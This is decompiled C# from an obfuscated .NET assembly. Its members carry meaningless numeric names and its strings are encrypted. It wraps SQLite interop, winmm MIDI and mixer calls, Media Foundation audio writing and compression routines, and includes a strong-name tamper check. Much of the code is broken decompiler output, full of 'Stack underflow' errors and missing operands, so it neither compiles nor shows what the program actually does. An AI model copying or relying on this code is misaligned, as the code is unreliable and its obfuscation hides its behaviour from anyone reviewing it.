				array2 = new object[1] { array2 };
			}
			return array2;
		}

		protected new virtual object[] _0001(object[] _0002, int _0003, object _0004, bool _0005)
		{
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 2
			object[] array = new object[4];
			_ = 0;
			_0080._0014._0001(107362916);
			((object[])/*Error near IL_0013: Stack underflow*/)[/*Error near IL_0013: Stack underflow*/] = (object)/*Error near IL_0013: Stack underflow*/;
			array[1] = _0002;
			array[2] = _0003;
			array[3] = _0004;
			object[] array2 = array;
			if (!_0005)
			{
				array2 = new object[1] { array2 };
			}
			return array2;
		}

		protected new virtual void _0001(object[] _0002, ref object _0003, bool _0004)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			object[] array = (((int)/*Error near IL_0004: Stack underflow*/ != 0) ? ((object[])/*Error near IL_0028: Stack underflow*/) : (_0002[0] as object[]));
			if (array != null)
			{
				_0003 = array[^1];
			}
		}

		protected new virtual object[] _0001(object _0002, bool _0003)
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 2
			object[] array = new object[2];
			_ = 0;
			_0080._0014._0001(107362939);
			((object[])/*Error near IL_0013: Stack underflow*/)[/*Error near IL_0013: Stack underflow*/] = (object)/*Error near IL_0013: Stack underflow*/;
			array[1] = _0002;
			object[] array2 = array;
			if (!_0003)
			{
				array2 = new object[1] { array2 };
			}
			return array2;
		}

		protected new virtual object[] _0001(string _0002, string _0003, bool _0004)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 2
			object[] array = new object[3];
			_ = 0;
			_0080._0014._0001(107362930);
			((object[])/*Error near IL_0013: Stack underflow*/)[/*Error near IL_0013: Stack underflow*/] = (object)/*Error near IL_0013: Stack underflow*/;
			array[1] = _0002;
			array[2] = _0003;
			object[] array2 = array;
			if (!_0004)
			{
				array2 = new object[1] { array2 };
			}
			return array2;
		}

		public override object _0001(object[] _0002)
		{
			//IL_0072: Incompatible stack heights: 0 vs 1
			//IL_007c: Incompatible stack heights: 0 vs 1
			//IL_0083: Incompatible stack heights: 0 vs 1
			if ((object)((_0019)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
			{
				_008F_0003._008C_0007();
				_0080._0014._0001(107362885);
				throw new InvalidOperationException(global::_0011._0018._0001(_0004: new object[1] { _0080._0014._0001(107362925) }, _0002: (IFormatProvider)/*Error near IL_0031: Stack underflow*/, _0003: (string)/*Error near IL_0031: Stack underflow*/));
			}
			if (this.m__0001 is global::_0013._0016 obj2)
			{
				return obj2(_0080._0014._0001(107362925), _0002);
			}
			return _009B_0004._007E_0083_000E(this.m__0001, _0001(_0002, _0003: false));
		}

		public override void _0001(object[] _0002, int _0003, ref object _0004)
		{
			//IL_0086: Incompatible stack heights: 0 vs 1
			//IL_0090: Incompatible stack heights: 0 vs 1
			//IL_009a: Incompatible stack heights: 0 vs 1
			if ((object)((_0019)/*Error near IL_000a: Stack underflow*/).m__0001 == null)
			{
				_008F_0003._008C_0007();
				_0080._0014._0001(107362885);
				throw new InvalidOperationException(global::_0011._0018._0001(_0004: new object[1] { _0080._0014._0001(107362916) }, _0002: (IFormatProvider)/*Error near IL_0034: Stack underflow*/, _0003: (string)/*Error near IL_0034: Stack underflow*/));
			}
			if (this.m__0001 is global::_0007._001D obj2)
			{
				obj2(_0080._0014._0001(107362916), _0002, _0003, ref _0004);
				return;
			}
			object[] array = _0001(_0002, _0003, _0004, _0005: false);
			_009B_0004._007E_0083_000E(this.m__0001, array);
			_0001(array, ref _0004, _0004: false);
		}

		public override object _0001(object _0002)
		{
			//IL_0072: Incompatible stack heights: 0 vs 1
			//IL_007c: Incompatible stack heights: 0 vs 1
			//IL_0083: Incompatible stack heights: 0 vs 1
			if ((object)((_0019)/*Error near IL_0007: Stack underflow*/)._0002 == null)
			{
				_008F_0003._008C_0007();
				_0080._0014._0001(107362885);
				throw new InvalidOperationException(global::_0011._0018._0001(_0004: new object[1] { _0080._0014._0001(107362939) }, _0002: (IFormatProvider)/*Error near IL_0031: Stack underflow*/, _0003: (string)/*Error near IL_0031: Stack underflow*/));
			}
			if (this._0002 is global::_001A._0017 obj2)
			{
				return obj2(_0080._0014._0001(107362939), _0002);
			}
			return _009B_0004._007E_0083_000E(this.m__0001, _0001(_0002, _0003: false));
		}

		public override int _0001(string _0002, string _0003)
		{
			//IL_00c0: Incompatible stack heights: 0 vs 1
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 1
			if ((object)((_0019)/*Error near IL_000a: Stack underflow*/).m__0001 == null)
			{
				_008F_0003._008C_0007();
				_0080._0014._0001(107362885);
				throw new InvalidOperationException(global::_0011._0018._0001(_0004: new object[1] { _0080._0014._0001(107362930) }, _0002: (IFormatProvider)/*Error near IL_003a: Stack underflow*/, _0003: (string)/*Error near IL_003a: Stack underflow*/));
			}
			if (this.m__0001 is _001E._0014 obj2)
			{
				return obj2(_0080._0014._0001(107362930), _0002, _0003);
			}
			object obj3 = _009B_0004._007E_0083_000E(this.m__0001, _0001(_0002, _0003, _0004: false));
			if (obj3 is int)
			{
				return (int)obj3;
			}
			throw new InvalidOperationException(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107362848), new object[1] { _0080._0014._0001(107362930) }));
		}
	}
}
namespace _001C
{
	internal sealed class _0017 : global::_0012._0014
	{
		internal new bool _0001;

		protected override void _0001(bool _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((_0017)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			finally
			{
				base._0001(_0002);
				this._0001 = true;
			}
		}

		static _0017()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0016
{
	internal enum _001C
	{
		_0001,
		_0002,
		_0003
	}
}
namespace _0019
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate void _001F(IntPtr context, int argc, IntPtr argv);
}
namespace _0002
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate void _001C(IntPtr context);
}
namespace _0006
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate int _001A(IntPtr puser, int len1, IntPtr pv1, int len2, IntPtr pv2);
}
namespace _0011
{
	internal sealed class _0018
	{
		static string _0001(global::_0002._0002 P_0)
		{
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 1
			_ = _0083_0002._007E_008C_0005;
			BinaryReader binaryReader = ((global::_0002._0002)/*Error near IL_000c: Stack underflow*/)._0001;
			/*Error near IL_0044: Stack underflow*/(binaryReader, 4);
			byte[] array = (byte[])/*Error near IL_0047: Stack underflow*/;
			if (array.Length != 4)
			{
				throw new InvalidDataException(_0080._0014._0001(107362843));
			}
			return _0084_0002._007E_008D_0005(global::_000E._0012._0001, array, 0, array.Length);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_value_double")]
		static extern double _0001(IntPtr _0002);

		static void _0001(_001F._0019._0003 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((_001F._0019._0003)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(_001F._0019._0003).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static int _0001(_001A._0018 P_0)
		{
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((_001A._0018)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002c: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return 0;
			}
			return _0018._0001(((_001A._0018)/*Error near IL_001e: Stack underflow*/)._0001);
		}

		static void _0001(bool _0002, IntPtr _0003, ref global::_0014._0018 _0004)
		{
			//IL_0319: Incompatible stack heights: 0 vs 2
			//IL_0323: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0323: Stack underflow*/((IntPtr)/*Error near IL_0323: Stack underflow*/, zero);
			if ((int)/*Error near IL_0016: Stack underflow*/ != 0)
			{
				return;
			}
			int num = 0;
			int num2 = _0018._0001(_0003, num);
			num = _0018._0001(num, 4, _001B_0003._0097_0006());
			IntPtr intPtr = _0018._0001(_0003, num);
			num = _0018._0001(num, _001B_0003._0097_0006(), 4);
			int num3 = _0018._0001(_0003, num);
			num = _0018._0001(num, 4, _001B_0003._0097_0006());
			IntPtr intPtr2 = _0018._0001(_0003, num);
			IntPtr intPtr3 = IntPtr.Zero;
			if (_0002)
			{
				num = _0018._0001(num, _001B_0003._0097_0006(), _001B_0003._0097_0006());
				intPtr3 = _0018._0001(_0003, num);
			}
			_0004 = new global::_0014._0018(num2, num3);
			global::_0002._001D obj = _0004._0001;
			if (obj == null)
			{
				return;
			}
			global::_0003._0017[] array = obj._0001;
			if (array == null)
			{
				return;
			}
			global::_0003._0018[] array2 = obj._0001;
			if (array2 == null)
			{
				return;
			}
			Type type = _0091._0080_0004(typeof(global::_0017._0084._007F).TypeHandle);
			int num4 = _009C_0004._0084_000E(type);
			for (int i = 0; i < num2; i++)
			{
				IntPtr intPtr4 = _0018._0001(intPtr, i * num4);
				global::_0017._0084._007F obj2 = (global::_0017._0084._007F)_0097._0088_0004(intPtr4, type);
				array[i] = new global::_0003._0017(obj2);
			}
			Type type2 = _0091._0080_0004(typeof(global::_0017._0084._0080).TypeHandle);
			int num5 = _009C_0004._0084_000E(type2);
			for (int j = 0; j < num3; j++)
			{
				IntPtr intPtr5 = _0018._0001(intPtr2, j * num5);
				global::_0017._0084._0080 obj3 = (global::_0017._0084._0080)_0097._0088_0004(intPtr5, type2);
				array2[j] = new global::_0003._0018(obj3);
			}
			if (!_0002)
			{
				return;
			}
			global::_0016._001E obj4 = _0004._0001;
			if (obj4 == null)
			{
				return;
			}
			global::_0001._0080[] array3 = obj4._0001;
			if (array3 != null)
			{
				Type type3 = _0091._0080_0004(typeof(global::_0017._0084._0081).TypeHandle);
				int num6 = _009C_0004._0084_000E(type3);
				for (int k = 0; k < num2; k++)
				{
					IntPtr intPtr6 = _0018._0001(intPtr3, k * num6);
					global::_0017._0084._0081 obj5 = (global::_0017._0084._0081)_0097._0088_0004(intPtr6, type3);
					array3[k] = new global::_0001._0080(obj5);
				}
				num = _0018._0001(num, _001B_0003._0097_0006(), 4);
				obj4._0001 = _0018._0001(_0003, num);
				num = _0018._0001(num, 4, _001B_0003._0097_0006());
				obj4._0001 = _0018._0001(_0018._0001(_0003, num));
				num = _0018._0001(num, _001B_0003._0097_0006(), 4);
				obj4._0002 = _0018._0001(_0003, num);
				num = _0018._0001(num, 4, 4);
				obj4._0003 = _0018._0001(_0003, num);
				num = _0018._0001(num, 4, 8);
				obj4._0001 = _0018._0001(_0003, num);
				num = _0018._0001(num, 8, 8);
				if (_0018._0001(obj4))
				{
					obj4._0001 = _0018._0001(num, _0003);
				}
				num = _0018._0001(num, 8, 4);
				if (_0018._0001(obj4))
				{
					obj4._0001 = (_001A._0019)_0018._0001(_0003, num);
				}
				num = _0018._0001(num, 4, 8);
				if (_0018._0001(obj4))
				{
					obj4._0002 = _0018._0001(num, _0003);
				}
			}
		}

		static bool _0001(bool _0002, IFormatProvider _0003, object _0004)
		{
			//IL_0185: Incompatible stack heights: 0 vs 1
			//IL_018b: Incompatible stack heights: 0 vs 3
			//IL_0195: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				return false;
			}
			_ = _009D_0004._0086_000E;
			_ = _001D_0003._007E_009D_0006;
			/*Error near IL_0195: Stack underflow*/((object)/*Error near IL_0195: Stack underflow*/);
			TypeCode typeCode = /*Error near IL_0022: Stack underflow*/((Type)/*Error near IL_0022: Stack underflow*/);
			switch (typeCode)
			{
			case TypeCode.Empty:
			case TypeCode.DBNull:
				return false;
			case TypeCode.Boolean:
				return (bool)_0004;
			case TypeCode.Char:
				if ((char)_0004 == '\0')
				{
					return false;
				}
				return true;
			case TypeCode.SByte:
				if ((sbyte)_0004 == 0)
				{
					return false;
				}
				return true;
			case TypeCode.Byte:
				if ((byte)_0004 == 0)
				{
					return false;
				}
				return true;
			case TypeCode.Int16:
				if ((short)_0004 == 0)
				{
					return false;
				}
				return true;
			case TypeCode.UInt16:
				if ((ushort)_0004 == 0)
				{
					return false;
				}
				return true;
			case TypeCode.Int32:
				if ((int)_0004 == 0)
				{
					return false;
				}
				return true;
			case TypeCode.UInt32:
				if ((uint)_0004 == 0)
				{
					return false;
				}
				return true;
			case TypeCode.Int64:
				if ((long)_0004 == 0)
				{
					return false;
				}
				return true;
			case TypeCode.UInt64:
				if ((ulong)_0004 == 0)
				{
					return false;
				}
				return true;
			case TypeCode.Single:
				if ((float)_0004 == 0f)
				{
					return false;
				}
				return true;
			case TypeCode.Double:
				if ((double)_0004 == 0.0)
				{
					return false;
				}
				return true;
			case TypeCode.Decimal:
				if (!_009E_0004._0087_000E((decimal)_0004, 0m))
				{
					return false;
				}
				return true;
			case TypeCode.String:
				if (!_0002)
				{
					return global::_0001._001A._0001(_0018._0001(_0004, _0003));
				}
				return _0090_0004._0018_000E(_0004, _0003);
			default:
				throw new SQLiteException(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107363322), new object[1] { typeCode }));
			}
		}

		static string _0001(global::_0017._0015 P_0)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			new StringBuilder(256);
			StringBuilder stringBuilder = default(StringBuilder);
			if (0 == 0)
			{
				stringBuilder = (StringBuilder)/*Error near IL_0037: Stack underflow*/;
			}
			((global::_0017._0015)/*Error near IL_0012: Stack underflow*/)._0001._0001(P_0._0001, stringBuilder);
			return global::_0002._007E_0006(stringBuilder);
		}

		static object _0001(_001B._0008 P_0)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			new _007F._0004();
			return (object)/*Error near IL_0003: Stack underflow*/;
		}

		[DllImport("winmm.dll", EntryPoint = "midiInClose")]
		static extern MmResult _0001(IntPtr _0002);

		[DllImport("mfreadwrite.dll", EntryPoint = "MFCreateSinkWriterFromURL", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001([In][MarshalAs(UnmanagedType.LPWStr)] string _0002, [In] _0010 _0003, [In] global::_0008._000E _0004, out global::_000E._0016 _0005);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _0019._0012 _0001(global::_0005._0005 _0002)
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			_0018._0001();
			_0019._0012 obj = (_0019._0012)/*Error near IL_0035: Stack underflow*/;
			try
			{
				_0018._0001(_0003: _0002, _0004: _0098._0089_0004(_0002), _0002: (_0019._0012)/*Error near IL_0017: Stack underflow*/);
				return obj;
			}
			catch (Exception)
			{
				_0098._008A_0004(obj);
				throw;
			}
		}

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerGetControlDetails")]
		static extern MmResult _0001(IntPtr _0002, ref global::_0015._0003._0001 _0003, _001D._0001 _0004);

		static void _0001(int _0002, byte[] _0003, int _0004, bool _0005, global::_0017._007F._0007 P_4)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._007F._0007)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = (((int)/*Error near IL_000b: Stack underflow*/ != 0) ? 1 : 0);
			_0018._0001((global::_0017._007F._000E)/*Error near IL_005c: Stack underflow*/, num, 3);
			_0018._0001(P_4._0001);
			_0018._0001(_0002, P_4._0001);
			_0018._0001(~_0002, P_4._0001);
			_0018._0001(_0003, _0004, _0002, P_4._0001);
			_0018._0001(P_4);
		}

		static void _0001(global::_0017._007F._0007._0001 _0002, global::_0017._007F._0007._0001 P_1)
		{
			int num = -1;
			int num2 = 0;
			while (num2 < _0002._0002)
			{
				int num3 = 1;
				int num4 = _0002._0001[num2];
				int num5;
				int num6;
				if (num4 == 0)
				{
					num5 = 138;
					num6 = 3;
				}
				else
				{
					num5 = 6;
					num6 = 3;
					if (num != num4)
					{
						_0018._0001(P_1, num4);
						num3 = 0;
					}
				}
				num = num4;
				num2++;
				while (num2 < _0002._0002 && num == _0002._0001[num2])
				{
					num2++;
					if (++num3 >= num5)
					{
						break;
					}
				}
				if (num3 < num6)
				{
					while (num3-- > 0)
					{
						_0018._0001(P_1, num);
					}
				}
				else if (num != 0)
				{
					_0018._0001(P_1, 16);
					_0018._0001(_0002._0001._0001, num3 - 3, 2);
				}
				else if (num3 <= 10)
				{
					_0018._0001(P_1, 17);
					_0018._0001(_0002._0001._0001, num3 - 3, 3);
				}
				else
				{
					_0018._0001(P_1, 18);
					_0018._0001(_0002._0001._0001, num3 - 11, 7);
				}
			}
		}

		static global::_0010._0019 _0001(_001F._0015 _0002, string P_1)
		{
			//IL_0028: Incompatible stack heights: 0 vs 2
			//IL_002b: Incompatible stack heights: 0 vs 2
			global::_0018._0018 obj = null;
			_ = global::_0007._0097;
			_ = ((_001F._0015)/*Error near IL_000f: Stack underflow*/)._0001;
			int num = ((global::_0006._0015)/*Error near IL_0018: Stack underflow*/)._0001((string)/*Error near IL_0018: Stack underflow*/, out obj);
			/*Error near IL_001d: Stack underflow*/(num);
			return new global::_0010._0019(obj);
		}

		static void _0001(IntPtr _0002, global::_000E._001F _0003)
		{
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_0051: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return;
			}
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0051: Stack underflow*/((IntPtr)/*Error near IL_0051: Stack underflow*/, zero);
			if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
			{
				return;
			}
			try
			{
			}
			finally
			{
				global::_000E._001F obj;
				_0091_0002._009C_0005(obj = _0003);
				try
				{
					_0080._0017 obj2 = _0018._0001(_0002);
					if (obj2 != 0)
					{
						throw new SQLiteException(obj2, null);
					}
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		static string _0001(string _0002)
		{
			//IL_012f: Incompatible stack heights: 0 vs 2
			//IL_0139: Incompatible stack heights: 0 vs 1
			//IL_0143: Incompatible stack heights: 0 vs 1
			_ = global::_001C._0096_0003;
			/*Error near IL_0139: Stack underflow*/((string)/*Error near IL_0139: Stack underflow*/);
			if ((int)/*Error near IL_0014: Stack underflow*/ == 0)
			{
				_0018._0001();
				string text = (string)/*Error near IL_001a: Stack underflow*/;
				if (!global::_001C._0096_0003(text))
				{
					try
					{
						_0002 = global::_0003._007E_0080(_0002, global::_0017._0084._0006, text);
					}
					catch (Exception ex)
					{
						try
						{
							_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107363241), new object[1] { ex }));
						}
						catch
						{
						}
					}
				}
				Assembly assembly = null;
				try
				{
					assembly = global::_0001._0001();
				}
				catch (Exception ex2)
				{
					try
					{
						_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107363140), new object[1] { ex2 }));
					}
					catch
					{
					}
				}
				string text2 = _0018._0001(_0018._0001(assembly));
				if (!global::_001C._0096_0003(text2))
				{
					try
					{
						_0002 = global::_0003._007E_0080(_0002, global::_0017._0084._0007, text2);
						return _0002;
					}
					catch (Exception ex3)
					{
						try
						{
							_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107362539), new object[1] { ex3 }));
							return _0002;
						}
						catch
						{
							return _0002;
						}
					}
				}
			}
			return _0002;
		}

		static void _0001(_001C._0004 _0002, string _0003)
		{
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			_ = ((_001C._0004)/*Error near IL_005b: Stack underflow*/).WaveFormat;
			_001A._0005 obj = new _001A._0005((string)/*Error near IL_000b: Stack underflow*/, (global::_0005._0005)/*Error near IL_000b: Stack underflow*/);
			try
			{
				byte[] array = new byte[_0002.WaveFormat._0002 * 4];
				while (true)
				{
					int num = _0002.Read(array, 0, array.Length);
					if (num == 0)
					{
						break;
					}
					_0083._007E_0008_0004(obj, array, 0, num);
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_shutdown")]
		static extern _0080._0017 _0001();

		unsafe static void _0001(ref double _0002, global::_0002._0013 _0003, double P_2)
		{
			//IL_0005: Invalid comparison between Unknown and F8
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			double num = *(double*)(nint)/*Error near IL_0005: Stack underflow*/;
			if (!((double)/*Error near IL_0007: Stack underflow*/ <= num))
			{
				_0018._0001(((global::_0002._0013)/*Error near IL_000e: Stack underflow*/)._0001, P_2, ref _0002);
			}
			else
			{
				_0018._0001(_0003._0002, P_2, ref _0002);
			}
		}

		static void _0001()
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			try
			{
				_ = AppDomain.CurrentDomain;
				ResolveEventHandler value = _0018._0001;
				((AppDomain)/*Error near IL_001e: Stack underflow*/).AssemblyResolve += value;
			}
			catch
			{
			}
		}

		static long _0001(global::_0007._0013 _0002, global::_0015._0008 P_1)
		{
			//IL_007d: Incompatible stack heights: 0 vs 2
			//IL_0087: Incompatible stack heights: 0 vs 1
			_ = _0099._008C_0004;
			global::_0004._000F._0001<_0019._001A>();
			/*Error near IL_0087: Stack underflow*/((int)/*Error near IL_0087: Stack underflow*/);
			IntPtr intPtr = (IntPtr)/*Error near IL_008d: Stack underflow*/;
			try
			{
				int num = _0002._0001(-1, global::_0004._0011._001A, intPtr);
				switch (num)
				{
				case -1072875802:
					return 0L;
				default:
					global::_0007._0097(num);
					break;
				case 0:
					break;
				}
				return (long)global::_0004._000F._0001<_0019._001A>(intPtr).Value * P_1._0001._0002 / 10000000;
			}
			finally
			{
				_0019._001A._0001(intPtr);
				_009B._0090_0004(intPtr);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, EntryPoint = "sqlite3_win32_set_directory")]
		static extern _0080._0017 _0001(uint _0002, string _0003);

		static void _0001(global::_0017._007F._0002 P_0)
		{
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			int num;
			int num2 = (num = (P_0._0003 = 0));
			((global::_0017._007F._0002)/*Error near IL_0017: Stack underflow*/)._0002 = num2;
			int num3 = (num = num);
			((global::_0017._007F._0002)/*Error near IL_001f: Stack underflow*/)._0001 = num3;
			((global::_0017._007F._0002)/*Error near IL_0025: Stack underflow*/)._0001 = (uint)num;
		}

		static string _0001(string _0002, bool _0003)
		{
			//IL_0106: Incompatible stack heights: 0 vs 2
			//IL_0110: Incompatible stack heights: 0 vs 1
			//IL_0116: Incompatible stack heights: 0 vs 1
			_ = global::_001C._0096_0003;
			/*Error near IL_0110: Stack underflow*/((string)/*Error near IL_0110: Stack underflow*/);
			if ((int)/*Error near IL_0011: Stack underflow*/ != 0)
			{
				return (string)/*Error near IL_0017: Stack underflow*/;
			}
			if (_0012_0004._007E_0019_0008(_0002, _0080._0014._0001(107362442), StringComparison.OrdinalIgnoreCase))
			{
				string text = _0018._0001();
				if (global::_001A._007E_0016_0003(_0002) > global::_001A._007E_0016_0003(_0080._0014._0001(107362442)) && (_009F_0004._007E_0088_000E(_0002, global::_001A._007E_0016_0003(_0080._0014._0001(107362442))) == Path.DirectorySeparatorChar || _009F_0004._007E_0088_000E(_0002, global::_001A._007E_0016_0003(_0080._0014._0001(107362442))) == Path.AltDirectorySeparatorChar))
				{
					_0002 = _0087_0002._007E_0090_0005(_0002, global::_001A._007E_0016_0003(_0080._0014._0001(107362442)), 1);
				}
				_0002 = global::_000F._008C_0002(text, _009E_0003._007E_009E_0007(_0002, global::_001A._007E_0016_0003(_0080._0014._0001(107362442))));
			}
			if (_0003)
			{
				_0002 = global::_001E._009C_0003(_0002);
			}
			return _0002;
		}

		static void _0001(global::_0010._0082 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0010._0082)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0010._0082).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static _0019._0004 _0001(int _0002)
		{
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 1
			_0019._0004 result = default(_0019._0004);
			_ = _0098._0089_0004;
			object obj = (_0019._0004)/*Error near IL_0014: Stack underflow*/;
			/*Error near IL_0044: Stack underflow*/(obj);
			int num = (int)/*Error near IL_0047: Stack underflow*/;
			_0018._0001(_0018._0001(_0099._008E_0004(_0002), out result, num), _0080._0014._0001(107362453));
			return result;
		}

		unsafe static int _0001(int _0002, global::_000E._0019 _0003, out int _0004, [Out] int _0005, ref float[] P_4)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_000f: Invalid comparison between Unknown and I4
			//IL_0105: Incompatible stack heights: 0 vs 1
			//IL_010b: Incompatible stack heights: 0 vs 1
			//IL_0112: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0009: Stack underflow*/ > 64 || (int)/*Error near IL_0011: Stack underflow*/ < 1)
			{
				*(@null*)(nint)/*Error near IL_0018: Stack underflow*/ = null;
				_0004 = 0;
				return 0;
			}
			int num = 0;
			if (_0003._0008 > 1)
			{
				num = _0003._0008;
			}
			int num2 = num / 2;
			if (num2 > 1 && _0003._0006 < num2 - 1)
			{
				_0003._0005 += num2 - 1 - _0003._0006;
				_0003._0006 = num2 - 1;
				if (_0003._0006 > 0)
				{
					_0003._0001 = new float[_0003._0006 * _0005];
				}
			}
			int num3 = 0;
			num3 = (_0003._0002 ? _0002 : ((int)(_0003._0005 * (double)_0002) + 4 + num - _0003._0006));
			if (num3 < 0)
			{
				num3 = 0;
			}
			while (true)
			{
				Array.Resize(ref _0003._0001, (_0003._0006 + num3) * _0005);
				int num4 = _0003._0001.Length / ((_0005 == 0) ? 1 : _0005) - _0003._0006;
				if (num4 == num3)
				{
					break;
				}
				if (num3 > 4 && num4 == 0)
				{
					num3 /= 2;
					continue;
				}
				num3 = num4;
				break;
			}
			P_4 = _0003._0001;
			_0004 = _0003._0006 * _0005;
			_0003._0004 = num3;
			return num3;
		}

		static DataTable _0001(global::_0017._0080 _0002, string _0003, string _0004, string _0005, string P_4)
		{
			//IL_094a: Incompatible stack heights: 0 vs 1
			//IL_0954: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107362428);
			new DataTable((string?)/*Error near IL_0954: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_095a: Stack underflow*/;
			List<KeyValuePair<int, string>> list = new List<KeyValuePair<int, string>>();
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362379), _0091._0080_0004(typeof(string).TypeHandle));
